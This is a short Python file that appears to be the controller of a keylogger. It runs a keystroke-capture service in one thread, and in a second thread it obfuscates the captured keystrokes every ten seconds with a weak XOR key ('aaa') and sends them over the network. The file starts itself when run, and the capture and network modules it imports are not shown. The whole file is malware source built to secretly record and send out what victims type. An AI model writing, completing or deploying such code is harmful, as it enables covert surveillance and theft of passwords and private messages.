from dc_KeyloggerService import KeyloggerService
from dc_FileWriter import FileWriter
from dc_Encryptor import Encryptor
from dc_network_writer import Network_writer
import threading
import time


class KeyLoggerManager:

    def __init__(self):
        self.instance = KeyloggerService()


    def start(self):
        self.instance.start()
        while self.instance.return_action():
            pass
        
        return

    def write_to_file(self):
        while self.instance.return_action():
            stop_key_looger = Network_writer.write(self.xor_encryption())
            if not (stop_key_looger):
                self.instance.start()
            time.sleep(10)


    def xor_encryption(self):
        # print(self.instance.get_data())
        return Encryptor.xor_encryption(self.instance.get_data(),"aaa")

    def main(self):
        threading.Thread(target=self.start).start()
        # print("aaa")
        threading.Thread(target=self.write_to_file).start()

a = KeyLoggerManager()
a.main()
# a.write_to_file()
# לסדק קוד שעובד רק כשמלחובר לרשת
